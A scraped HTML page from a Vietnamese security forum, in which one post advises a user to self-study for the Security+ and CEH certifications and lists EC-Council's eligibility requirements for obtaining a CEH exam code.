</blockquote><br/> Mình còn rất trẻ <img src="/hvaonline/images/smilies/84f7247f3b4764f31ec8201051b4ba7b.gif" border="0" alt="smilie" align="absbottom"> , gọi chú nghe ghê ghê <img src="/hvaonline/images/smilies/246ed95454d12f21d9fc0259316b750d.gif" border="0" alt="smilie" align="absbottom"> . Diễn đàn HVA là nơi lý tưởng để bạn trao đổi và học hỏi, mọi vấn đề thắc mắc bạn có thể gửi lên đây, mọi người sẽ giải đáp cho bạn. </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24335.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24335/147160.html#147160,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Nếu kiến thức của bạn tạm ổn như bạn nói thì bạn thử hãy tự học và thi. Như vậy tốt hơn, tôi thấy không quá khó đâu. Khi tôi thi Security+ và CEH thì thấy tiền lệ phí thi đã chóng mặt rồi, do vậy tự học cho đỡ tốn tiền <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> . Thi Security+ thì chỉ cần nộp $$$ vào là thi thôi còn muốn thì CEH thì bạn phải có code do CEH cấp, rồi dùng code đó mới đăng kí VUE hoặc Prometric tham dự thi. Điều kiện làm thì cũng không có gì khó khăn: 1) Có 2 năm kinh nghiệm liên quan đến bảo mật, 2) Download cái mẫu form trên trang Web ECCouncil về, 3) Scan cái CMND hoặc bằng lái xe, 4) Một lá thư của boss chứng nhận bạn đã có kinh nghiệm 2 năm liên quan đến bảo mật.<br/> Sau khi có đủ giấy tờ trên một là fax hoặc email đến ECCouncil. Theo tôi nên gửi email là nhanh nhất, lúc tôi gửi yêu cầu code, một tí nó reply ngay <img src="/hvaonline/images/smilies/8558d3a641379e9d3e663b443adb34c1.gif" border="0" alt="smilie" align="absbottom"> . Lưu ý là địa chỉ email của bạn là địa chỉ email của công ty bạn hoặc không phải địa chỉ email free như gmail, yahoo, msn, ...<br/><br/> Chúc bạn thành công !</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/332.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
								<a href="/hvaonline/posts/listByUser/60/332.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 3" title="Page 3"/>
								</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/90/332.html">4</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/120/332.html">5</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/150/332.html">6</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/332' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" selected="selected">7</option>	
								<option value="8" >8</option>	
								<option value="9" >9</option>	
								<option value="10" >10</option>	
								<option value="11" >11</option>	
								<option value="12" >12</option>	
						</select>
						
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/210/332.html">8</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/240/332.html">9</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/270/332.html">10</a></span>
								<a href="/hvaonline/posts/listByUser/300/332.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 11" title="Page 11"/>
								</a>
						
						<a href="/hvaonline/posts/listByUser/330/332.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (12)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
